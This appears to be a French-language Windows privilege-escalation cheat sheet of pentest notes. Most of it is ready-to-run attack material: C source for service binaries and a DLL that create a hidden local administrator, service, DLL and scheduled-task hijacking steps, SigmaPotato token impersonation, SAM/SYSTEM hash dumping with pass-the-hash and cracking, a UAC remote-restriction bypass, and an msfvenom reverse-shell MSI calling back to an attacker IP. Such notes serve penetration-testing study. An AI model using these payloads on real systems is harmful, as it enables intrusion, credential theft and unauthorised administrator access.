# Chemins Courants

| Check                      | Commande                         | Escalade                           |
| :------------------------- | :------------------------------- | :--------------------------------- |
| SeImpersonatePrivilege     | `whoami /priv`                   | SigmaPotato / PrintSpoofer         |
| SeBackupPrivilege          | `whoami /priv`                   | SAM/SYSTEM dump → secretsdump      |
| Scheduled Tasks            | `schtasks /query /fo LIST /v`    | Task hijack                        |
| Unquoted Service           | `wmic service get name,pathname` | Binary replace / Service hijacking |
| DLL Hijacking              | Process Monitor analysis         | DLL malveillante                   |
| AlwaysInstallElevated      | `reg query HKLM\...\Installer`   | MSI payload                        |
| AutoLogon                  | Registry Winlogon                | WinPEAS trouve automatiquement     |
| Saved credentials          | `cmdkey /list` + RunAs           |                                    |
| AllExtendedRights sur user | Reset password                   |                                    |

# Commandes utiles

**ExecutionPolicy**

```powershell
powershell -ep bypass
Get-ExecutionPolicy
Set-ExecutionPolicy Unrestricted -Scope Process
```

# Enumération

## Enumération manuelle

**Username et hostname**
```cmd
whoami
```

**Groupes de l'utilisateur courant**
```cmd
whoami /groups
```

**Utilisateurs locaux**

```cmd
net user
net user <username>
```

```powershell
Get-LocalUser
```

**Groupes locaux**

```cmd
net localgroup
net localgroup <groupname>
```

```powershell
Get-LocalGroup
Get-LocalGroupMember <groupname>
```

**OS, version et architecture**
```cmd
systeminfo
```

**Applications installées (32-bit et 64-bit)**
```powershell
# 32bits
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname

# 64bits
Get-ItemProperty "HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
```

```cmd
dir "C:\Program Files"
dir "C:\Program Files (x86)"
dir C:\Users\<user>\Downloads
```

**Processus en cours d'exécution**
```powershell
Get-Process

# Process non standard Windows
Get-Process | Where-Object {$_.Path -notlike "C:\Windows\*" -and $_.Path -ne $null} | Select-Object Id, Name, Path, CPU, WS

# Path du binaire derrière le process
Get-Process NonStandardProcess | Select-Object Path
```

**Services**

```powershell
Get-CimInstance Win32_Service | Select-Object Name, State, StartMode, PathName

# Ancienne méthode
Get-WmiObject Win32_Service | Select-Object Name, State, StartMode, PathName

# Via registre
Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\*" | Select-Object PSChildName, Start, ImagePath

Get-ItemProperty "HKLM:\SYSTEM\CurrentControlSet\Services\*" |
Where-Object { $_.ImagePath -notmatch "^$|system32|syswow64|SystemRoot|MsMpEng"} |
Select-Object PSChildName, ImagePath, Start

# Start values in registry (HKLM:\SYSTEM\CurrentControlSet\Services)
# 0 - Boot     : chargé par le bootloader avant le noyau
# 1 - System   : chargé par le noyau au démarrage
# 2 - Automatic: démarré automatiquement par le SCM au boot
# 3 - Manual   : démarré sur demande
# 4 - Disabled : désactivé

# Via sc.exe
sc.exe query type= all state= all

# Autre
Get-Service | Select-Object Name, Status, StartType
```

```cmd
wmic service get name,state,startmode,pathname
```

**Recherche de fichiers sensibles par extension**
```powershell
Get-ChildItem -Path C:\Users\ -Include *.ini,*.kdbx,*.txt,*.pdf,*.xls,*.xlsx,*.doc,*.docx,*.rar,*.zip,*.7z,*.rdp,*.rdg,*.ssetting,*.settings,*.log,*.config -File -Recurse -ErrorAction SilentlyContinue

# CMD
dir /s /b /a C:\*.kdbx 2>nul
```

**Lire un fichier**
```powershell
# Aliases pour Get-Content
type C:\path\to\file.txt
cat C:\path\to\file.txt
gc C:\path\to\file.txt
Get-Content C:\path\to\file.txt
```

```cmd
type C:\path\to\file.txt
```

**Exécuter une commande en tant qu'un autre utilisateur**

Nécessite un accès GUI (RDP ou session physique) - le prompt de mot de passe n'accepte pas l'input depuis un bind shell ou WinRM.

```cmd
runas /user:<username> cmd
```

**Historique PowerShell (Get-History)**

Ne contient que les commandes de la session courante, effacé par `Clear-History`.

```powershell
Get-History
```

**Historique PSReadline**

Non effacé par `Clear-History` - contient l'historique persistant entre les sessions.

```powershell
(Get-PSReadlineOption).HistorySavePath
type C:\Users\<user>\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt

PS C:\Users\Administrator\Documents> (Get-PSReadlineOption).HistorySavePath
C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
PS C:\Users\Administrator\Documents> cd C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\
PS C:\Users\Administrator\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine> type *
C:\users\support\admintool.exe hghgib6vHT3bVWf cmd
<SNIP>
```

**Transcripts PowerShell**

Enregistrent toutes les commandes et leur output, peuvent contenir des credentials en clair.

```powershell
type C:\Users\Public\Transcripts\transcript01.txt
```

**Se connecter en WinRM avec des credentials**

Équivalent Windows de SSH, basé sur HTTP/HTTPS, port 5985 (HTTP) ou 5986 (HTTPS).

```powershell
$password = ConvertTo-SecureString "<password>" -AsPlainText -Force
$cred = New-Object System.Management.Automation.PSCredential("<username>", $password)
Enter-PSSession -ComputerName <host> -Credential $cred
```

```bash
evil-winrm -i <ip> -u '<username>' -p '<password>'
download fichier
upload fichier
```

**Event Viewer**

Logs les scripts PowerShell exécutés. Dans l'Event Viewer : `Applications and Services Logs > Microsoft > Windows > PowerShell > Operational`, filtrer par Event ID 4104. Chercher des mots de passe dans les entrées.

```powershell
Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" | Where-Object {$_.Id -eq 4104} | Select-Object TimeCreated, Message | Format-List
```

**Chercher des creds**
  - Historique PowerShell : `Get-History`
  - Vault Windows : `cmdkey /list`
  - Notes / sticky notes : `C:\Users\*\AppData\Local\...`
## Enumération automatique

### PrivescCheck
https://github.com/itm4n/PrivescCheck

```bash
wget https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1

powershell -ep bypass -c ". .\PrivescCheck.ps1; Invoke-PrivescCheck -Report PRIVCHECK -Format HTML"
```

### winPEAS
https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS

Peut être bloqué par l'AV. Alternatives : Seatbelt, JAWS. Ne remplace pas l'énumération manuelle (peut rater des fichiers, mal identifier l'OS, etc.).

Formats disponibles sur Kali dans `/usr/share/peass/winpeas/` :

| Format | Avantages | Inconvénients |
|--------|-----------|---------------|
| `.exe` | Plus complet, standalone | Détecté facilement par AV |
| `.ps1` | Flexible, AMSI peut être bypassé | AMSI, politique d'exécution restrictive |
| `.bat` | Furtif, pas de dépendances | Très limité en fonctionnalités |

AMSI (Antimalware Scan Interface) : interface Windows qui permet aux AV de scanner les scripts PowerShell en mémoire avant exécution, même obfusqués.

Recommandation pentest : `.ps1` avec bypass AMSI si l'AV est un obstacle, sinon `.exe` pour les résultats les plus complets.

```bash
# Kali : copier le binaire et servir via HTTP
cp /usr/share/peass/winpeas/winPEASx64.exe .
python3 -m http.server 80
```

```powershell
# Cible : télécharger et exécuter
iwr -uri http://<ip>/winPEASx64.exe -Outfile winpeas.exe

.\winpeas.exe all > winpeas.txt
.\winpeas.exe all | Tee-Object -FilePath winpeas.txt
```

**Parse export**
https://github.com/jsdlm/scripts/blob/main/privesc/peasParser.py
```shell
python3 peasParser.py winpeas.txt
```
### Seatbelt
https://github.com/GhostPack/Seatbelt.git

Compiler sur une machine Windows avec VS Build Tools, transférer le binaire sur la cible.

```cmd
# Prérequis sur la machine de compilation
winget install Microsoft.VisualStudio.2022.BuildTools
git clone https://github.com/GhostPack/Seatbelt.git
cd Seatbelt
msbuild Seatbelt.sln /p:Configuration=Release
```

```powershell
# Cible : télécharger et exécuter
iwr -uri http://<ip>/Seatbelt.exe -Outfile Seatbelt.exe
.\Seatbelt.exe -group=all
.\Seatbelt.exe -group=all > output.txt
```

**si .NET 3.5 absent sur la cible**

Recompiler en ciblant .NET 4.x. Vérifier la version disponible sur la machine de compilation, modifier `Seatbelt\Seatbelt.csproj`, puis recompiler.

```cmd
# Vérifier les versions .NET disponibles
winget install Microsoft.DotNet.Framework.DeveloperPack_4
dir "C:\Program Files (x86)\Reference Assemblies\Microsoft\Framework\.NETFramework\"
```

```xml
<!-- Seatbelt.csproj : modifier la ligne TargetFrameworkVersion -->
<TargetFrameworkVersion>v4.8.1</TargetFrameworkVersion>
```

```cmd
msbuild Seatbelt.sln /p:Configuration=Release
```

# Windows Services

## Service Binary Hijacking

### Manuel

**Lister les services en cours avec leur binaire**

```powershell
Get-CimInstance Win32_Service | Select-Object Name, State, StartMode, PathName | Where-Object {$_.State -like 'Running'}

Get-CimInstance Win32_Service | Select-Object Name, State, StartMode, PathName | Where-Object {$_.PathName -notmatch 'C:\\Windows'}

Get-CimInstance Win32_Service -Filter "Name='EnterpriseService'" | Select-Object Name, State, StartMode, StartName, PathName
```

**Vérifier les permissions sur un binaire de service**

Masks : `F` = Full, `M` = Modify, `RX` = Read+Execute, `R` = Read, `W` = Write.

```cmd
icacls "C:\xampp\mysql\bin\mysqld.exe"
```

Si pas les droits sur le binaire vérifier les droits sur le folder, si droits `M` : renommer le folder et en créer un nouveau avec son binaire malveillant.

**Créer un binaire malveillant (ajoute un user admin)**

```c
#include <stdlib.h>
int main() {
  system("net user johndoe Password123! /add");
  system("net localgroup administrators johndoe /add");
  return 0;
}
```

```c
#include <stdlib.h>
int main() {
  system("net user enterpriseuser Password123!");
  return 0;
}
```

```bash
# Kali : compiler et servir
x86_64-w64-mingw32-gcc adduser.c -o adduser.exe
python3 -m http.server 80
```

**Remplacer le binaire et déclencher l'exécution**

```powershell
iwr -uri http://<ip>/adduser.exe -Outfile adduser.exe
move C:\xampp\mysql\bin\mysqld.exe mysqld.exe        # backup
move .\adduser.exe C:\xampp\mysql\bin\mysqld.exe

# Redémarrer le service (si permissions suffisantes)
net stop mysql
net start mysql
```

**Si pas les droits de redémarrer - vérifier le Startup Type et rebooter**

Si le service est `Auto`, un reboot suffit. Vérifier `SeShutdownPrivilege`.

```powershell
Get-CimInstance -ClassName win32_service | Select-Object Name, State, StartMode, PathName | Where-Object {$_.Name -like 'mysqld'}

whoami /priv
shutdown /r /t 0
```

**Vérifier que l'exploitation a fonctionné**

```cmd
net user
net localgroup administrators
```

### PowerUp
Crée un user `john` / `Password123!` ajouté aux admins locaux par défaut.

```bash
# Kali
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```

```powershell
iwr -uri http://<ip>/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-ModifiableServiceFile
# Puis utiliser l'AbuseFunction indiquée dans l'output
Install-ServiceBinary -Name '<service>'
```

Si l'AbuseFunction échoue (ex: argument avec chemin dans le PathName), faire l'exploitation manuellement.

## DLL Hijacking

### Manuel

**Identifier les DLLs manquantes avec Procmon**

Nécessite admin. 

```cmd
winget install Microsoft.Sysinternals.ProcessMonitor
```

Ou télécharger depuis : https://learn.microsoft.com/en-us/sysinternals/downloads/procmon

Lancer Procmon, filtrer sur `Process Name is <process>`. Si pas admin sur la cible, reproduire en local sur sa propre machine.

**Identifier les DLLs manquantes sur Kali**

```bash
strings service.exe | grep -i dll
objdump -p service.exe | grep -i dll
```

**DLL Search Order**

| Priority | Location                                    | Example                     |
| -------- | ------------------------------------------- | --------------------------- |
| 1        | Directory from which the application loaded | `C:\Program Files\App\`     |
| 2        | System directory                            | `C:\Windows\System32\`      |
| 3        | 16-bit system directory                     | `C:\Windows\System\`        |
| 4        | Windows directory                           | `C:\Windows\`               |
| 5        | Current directory                           | `C:\Users\john\`            |
| 6        | PATH environment variable directories       | `C:\Python39\`, `C:\tools\` |

**Vérifier qu'on peut écrire dans le répertoire de l'application**

```powershell
echo "test" > 'C:\FileZilla\FileZilla FTP Client\test.txt'
```

**Créer la DLL malveillante**

```cpp
#include <stdlib.h>
#include <windows.h>

BOOL APIENTRY DllMain(HANDLE hModule, DWORD ul_reason_for_call, LPVOID lpReserved) {
    switch (ul_reason_for_call) {
        case DLL_PROCESS_ATTACH:
            int i;
            i = system("net user john Password123! /add");
            i = system("net localgroup administrators john /add");
            break;
        case DLL_THREAD_ATTACH:
        case DLL_THREAD_DETACH:
        case DLL_PROCESS_DETACH:
            break;
    }
    return TRUE;
}
```

```bash
# Kali : compiler et servir
sudo apt install g++-mingw-w64-x86-64
x86_64-w64-mingw32-gcc adduser.cpp --shared -o adduser.dll
python3 -m http.server 80
```

**Placer la DLL et attendre l'exécution par un admin**

```powershell
iwr -uri http://<ip>/dll.dll -OutFile 'C:\FileZilla\FileZilla FTP Client\TextShaping.dll'
```

**Vérifier que l'exploitation a fonctionné**

```cmd
net user
net localgroup administrators
```

### PowerUp

Ne détecte que les DLLs déjà chargées, pas les `NAME NOT FOUND`. Les erreurs de process introuvables sont normales.

```bash
# Kali
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```

```powershell
iwr -uri http://<ip>/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Find-ProcessDLLHijack -ErrorAction SilentlyContinue
```

## Unquoted Service Paths

Si un chemin de service contient des espaces sans guillemets, Windows interprète chaque espace comme une fin de nom de fichier possible. Ex : `C:\Program Files\My App\service.exe` → Windows essaie `C:\Program.exe`, puis `C:\Program Files\My.exe`, etc. Si on peut écrire dans un de ces répertoires, on y place un binaire malveillant avec le nom attendu.

### Manuel

**Lister les services avec des espaces et sans guillemets**

```powershell
Get-CimInstance Win32_Service | Select-Object Name, State, StartMode, PathName | Where-Object {$_.PathName -notmatch '"' -and $_.PathName -notmatch 'C:\\Windows'}
```

```cmd
wmic service get name,pathname | findstr /i /v "C:\Windows\\" | findstr /i /v """
```

**Vérifier les permissions d'écriture sur les répertoires du chemin**

```cmd
icacls "C:\Program Files\Enterprise Apps"
```

**Placer le binaire malveillant et démarrer le service**

Le service peut retourner une erreur mais le binaire est quand même exécuté.

```powershell
iwr -uri http://<ip>/adduser.exe -Outfile Current.exe
copy .\Current.exe 'C:\Program Files\Enterprise Apps\Current.exe'
net start GammaService
```

**Vérifier que l'exploitation a fonctionné**

```cmd
net user
net localgroup administrators
```

### PowerUp

Crée un user `john` / `Password123!` ajouté aux admins locaux par défaut.

```bash
# Kali
cp /usr/share/windows-resources/powersploit/Privesc/PowerUp.ps1 .
python3 -m http.server 80
```

```powershell
iwr -uri http://<ip>/PowerUp.ps1 -Outfile PowerUp.ps1
powershell -ep bypass
. .\PowerUp.ps1
Get-UnquotedService
Write-ServiceBinary -Name 'GammaService' -Path "C:\Program Files\Enterprise Apps\Current.exe"
net stop GammaService
net start GammaService
```

**Vérifier que l'exploitation a fonctionné**

```cmd
net user
net localgroup administrators
```

# Scheduled Tasks

Points clés à identifier sur une tâche planifiée :
- **Principal** : sous quel compte tourne la tâche (SYSTEM, admin ?)
- **Trigger** : la condition d'exécution est-elle encore à venir ?
- **Action** : quel binaire/script est exécuté, et peut-on le remplacer ?

**Lister les tâches planifiées**

```powershell
Get-ScheduledTask | Select-Object URI, @{Name="RunAs";Expression={$_.Principal.UserId}}, @{Name="Execute";Expression={$_.Actions.Execute}} | Where-Object {$_.URI -notlike "\Microsoft\Windows\*"}

Get-ScheduledTask | Select-Object URI, Author, Description

Get-ScheduledTask | Select-Object URI, @{Name="RunAs";Expression={$_.Principal.UserId}}, @{Name="Execute";Expression={$_.Actions.Execute}}

Get-ScheduledTask | Select-Object URI, @{Name="Execute";Expression={$_.Actions.Execute}}, @{Name="Arguments";Expression={$_.Actions.Arguments}}
```

```cmd
schtasks /query /fo LIST /v

schtasks /query /fo LIST /v | Select-String -Pattern "\.exe" -Context 5,0

schtasks /query /fo LIST /v /tn "URIDeLaTache"
```

**Vérifier les permissions sur le binaire de la tâche**

```cmd
icacls C:\Users\steve\Pictures\BackendCacheCleanup.exe
```

**Remplacer le binaire et attendre l'exécution**

```powershell
iwr -Uri http://<ip>/adduser.exe -Outfile BackendCacheCleanup.exe
move .\Pictures\BackendCacheCleanup.exe BackendCacheCleanup.exe.bak
move .\BackendCacheCleanup.exe .\Pictures\
```

**Vérifier que l'exploitation a fonctionné**

```cmd
net user
net localgroup administrators
```


# Kernel Exploits

**Enumérer la version Windows et les patches de sécurité installés**

```cmd
systeminfo
```

```powershell
Get-CimInstance -Class win32_quickfixengineering | Where-Object { $_.Description -eq "Security Update" }
```

Chercher des CVE sur Google pour le build identifié, ou utiliser [wesng](https://github.com/bitsadmin/wesng) pour automatiser la recherche.

```cmd
# Cible : exporter systeminfo
systeminfo > C:\Users\Public\sysinfo.txt
```

Récupérer `sysinfo.txt` sur Kali et le passer à wesng. Les résultats avec `--exploits-only` indiquent des CVE avec un exploit public disponible.

```bash
# Kali
git clone https://github.com/bitsadmin/wesng
cd wesng
python wes.py --update
python wes.py sysinfo.txt -i "Elevation of Privilege" --exploits-only
```


**Exécuter l'exploit**

```cmd
.\CVE-2023-29360.exe
whoami
```

Les kernel exploits peuvent crasher le système - tester sur un clone avant.

# SeImpersonatePrivilege

### Théorie
Permet à un service de traiter une requête avec les droits du client qui s'y connecte, plutôt qu'avec ses propres droits (moindre privilège). Souvent présent sur les comptes de service IIS (LocalService, NetworkService, ApplicationPoolIdentity).
**Workflow légitime :**
1. Client s'authentifie auprès d'un service (ex: MSSQL, IIS).
2. LSASS crée un token pour ce client, attaché au thread du service.
3. Le service appelle `ImpersonateLoggedOnUser` sur ce token.
4. Les opérations du thread s'exécutent avec les droits du client.
5. `RevertToSelf` une fois terminé.

**Le détournement offensif**
SeImpersonatePrivilege n'autorise à impersonate **que** ce qui est présenté (authentification entrante), jamais un token pioché dans un autre process (ça nécessite SeDebugPrivilege, absent ici).
**Principe des Potatoes :** forcer un composant SYSTEM local à s'authentifier vers un listener contrôlé par l'attaquant (coerce), pour capturer ce token SYSTEM.

**Famille COM/DCOM - RottenPotato / JuicyPotato / GodPotato**
1. Attaquant instancie un objet COM (CLSID d'un service SYSTEM, ex: BITS).
2. Le DCOM Service Control Manager (SYSTEM) doit résoudre l'OXID de cet objet.
3. Attaquant monte un faux OXID resolver local.
4. DCOMLaunch (SYSTEM) s'authentifie NTLM auprès de ce faux resolver.
5. Token SYSTEM capturé → impersonation.
Évolutions : JuicyPotato (choix du CLSID/port), RoguePotato (contourne le blocage loopback post-patch), GodPotato (adapté aux OS récents).

**Famille Spouleur - PrintSpoofer**
Exploite `RpcRemoteFindFirstPrinterChangeNotificationEx` (MS-RPRN), normalement destinée à notifier un abonné d'événements d'impression.
1. Attaquant crée un named pipe local.
2. Appelle la fonction RPC en indiquant ce pipe comme destination des notifications.
3. Spouleur (SYSTEM) se connecte à ce pipe → authentification NTLM.
4. Attaquant capture via `ImpersonateNamedPipeClient`.
5. Token SYSTEM obtenu → impersonation.

**Finalisation commune**
`DuplicateToken` (impersonation → primaire) puis `CreateProcessAsUser` pour lancer un process en tant que SYSTEM.

### Pratique
**Vérifier le privilege**
```cmd
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
```

**Télécharger SigmaPotato et exécuter des commandes en SYSTEM**
```bash
# Kali : télécharger et servir
wget https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe
python3 -m http.server 80
```

```powershell
iwr -uri http://<ip>/SigmaPotato.exe -OutFile SigmaPotato.exe

.\SigmaPotato.exe "net user johndoe Password123! /add"
.\SigmaPotato.exe "cmd /c net user johndoe Password123! /add"

.\SigmaPotato.exe "net localgroup Administrators johndoe /add"
.\SigmaPotato.exe "cmd /c net localgroup Administrators johndoe /add"
```

Principe : forcer un processus SYSTEM à s'authentifier sur un named pipe contrôlé, capturer le token, l'impersonate.

Prérequis : `SeImpersonatePrivilege` ou `SeAssignPrimaryTokenPrivilege`.

| Outil                                                                                              | Notes                                                                                          |
| -------------------------------------------------------------------------------------------------- | ---------------------------------------------------------------------------------------------- |
| [RottenPotato](https://github.com/breenmachine/RottenPotatoNG)                                     | Le premier, exploite DCOM + NTLM relay local. Obsolète, patché.                                |
| [JuicyPotato](https://github.com/ohpe/juicy-potato)                                                | Amélioration de Rotten, choix du CLSID DCOM. Patché sur Windows 10 1809+ / Server 2019+.       |
| [PrintSpoofer](https://github.com/itm4n/PrintSpoofer)                                              | Exploite le Spooler via named pipe, fonctionne là où JuicyPotato échoue.                       |
| [SweetPotato](https://github.com/CCob/SweetPotato)                                                 | Combine JuicyPotato + PrintSpoofer, plus polyvalent.                                           |
| [GodPotato](https://github.com/BeichenDream/GodPotato)                                             | Exploite IRemUnknown2 via DCOM, fonctionne sur Windows 2012-2022. Le plus fiable actuellement. |
| [SigmaPotato](https://github.com/tylerdotrar/SigmaPotato/releases/download/v1.2.6/SigmaPotato.exe) | Variante moderne, simple d'utilisation.                                                        |
| [PetitPotato](https://github.com/wh0amitz/PetitPotato)                                             | + Moderne                                                                                      |
# Backup Operator

Le groupe `Backup Operators` confère `SeBackupPrivilege` et `SeRestorePrivilege`, permettant de lire/écrire n'importe quel fichier en bypassant les ACLs - y compris les ruches de registre contenant les hashes locaux.

**Vérifier la membership et les privilèges**

```cmd
whoami /groups
whoami /priv
```

**Sauvegarder les ruches SAM et SYSTEM**

```cmd
mkdir C:\temp
reg save HKLM\SAM C:\temp\SAM
reg save HKLM\SYSTEM C:\temp\SYSTEM
```

**Extraire les hashes**

```bash
# Transférer les fichiers sur Kali puis dump les hashs
impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

**Pass-the-Hash** - s'authentifier sans connaître le mot de passe en clair :

```bash
impacket-psexec -hashes :NTLMhash administrator@<IP>
evil-winrm -i <IP> -u administrator -H NTLMhash
```

**Crack offline** avec hashcat :

```bash
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

# LOLBAS
[LOLBAS](https://lolbas-project.github.io)

# Trouver des Creds

- **PowerShell history** : `C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt`
- **Registry AutoLogon** : `HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon`
- **Saved RDP connections** : `HKCU\Software\Microsoft\Terminal Server Client\Servers`
- **MSSQL credentials** : Si SQL Server tourne, se connecter et chercher une table creds
- https://github.com/AlessandroZ/LaZagne
- Snaffler

https://github.com/SnaffCon/Snaffler
https://github.com/zh54321/SnafflerParser
https://github.com/jsdlm/SnafflerParser

```bash
wget https://github.com/SnaffCon/Snaffler/releases/download/1.0.244/Snaffler.exe
.\Snaffler.exe -o snafflerout.txt -s -y
.\Snaffler.exe -o snafflerout.txt -s -y -i C:\
.\snafflerparser.ps1 -in snafflerout.txt
```

- Snaffler-ng
https://github.com/totekuh/snaffler-ng

```bash
pipx install snaffler-ng

nxc smb 10.0.0.0/24 -u user -p pass --shares | snaffler -u user -p pass --stdin

snaffler -u USER -p PASS --computer 10.0.0.5 --computer 10.0.0.6
snaffler -u USER -p PASS --computer 10.0.0.0/24
snaffler -u USER -p PASS --computer-file targets.txt

snaffler -u USER -p PASS -d DOMAIN.LOCAL
snaffler -k --use-kcache -d DOMAIN.LOCAL --dc-host CORP-DC02
```
# Create Admin Account + Bypass UAC

```
net user johndoe Password123! /add
net localgroup administrators johndoe /add
net localgroup "Remote Management Users" johndoe /add

reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f
```

# Windows.old

Downloaded SAM, SYSTEM files

```
*Evil-WinRM* PS C:\windows.old\Windows\System32> download SAM
*Evil-WinRM* PS C:\windows.old\Windows\System32> download SYSTEM

impacket-secretsdump -sam SAM -system SYSTEM LOCAL
```

# AlwaysInstallElevated

**Détection**
Vérifier les deux clés de registre :
```cmd
reg query HKCU\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
reg query HKLM\SOFTWARE\Policies\Microsoft\Windows\Installer /v AlwaysInstallElevated
```

```powershell
Get-ItemProperty HKCU:\SOFTWARE\Policies\Microsoft\Windows\Installer
Get-ItemProperty HKLM:\SOFTWARE\Policies\Microsoft\Windows\Installer
```

Les deux doivent retourner `0x1` pour que la vulnérabilité soit exploitable.

**Exploitation via RevShell**
```bash
msfvenom -p windows/x64/shell_reverse_tcp LHOST=<IP> LPORT=<PORT> -f msi -o evil.msi
```

```cmd
msiexec /quiet /qn /i evil.msi
```

**Exploitation via adduser**

```bash
sudo apt install wixl
```

**adduser.wxs**
```xml
<?xml version="1.0"?>
<Wix xmlns="http://schemas.microsoft.com/wix/2006/wi">
  <Product Id="*" Name="Update" Version="1.0.0" Manufacturer="MS" Language="1033">
    <Package InstallerVersion="200" Compressed="yes"/>
    <MediaTemplate EmbedCab="yes"/>
    <Feature Id="Main"><ComponentGroupRef Id="Files"/></Feature>
    <ComponentGroup Id="Files" Directory="TARGETDIR">
      <Component Id="MainComponent" Guid="12345678-1234-1234-1234-123456789012">
        <File Id="adduser.exe" Source="adduser.exe"/>
      </Component>
    </ComponentGroup>
    <CustomAction Id="Run" FileKey="adduser.exe" ExeCommand="" Execute="deferred" Impersonate="no"/>
    <InstallExecuteSequence>
      <Custom Action="Run" After="InstallFiles"/>
    </InstallExecuteSequence>
  </Product>
  <Fragment><Directory Id="TARGETDIR" Name="SourceDir"/></Fragment>
</Wix>
```

```bash
wixl -o adduser.msi adduser.wxs
```

```cmd
msiexec /quiet /qn /i adduser.msi
```
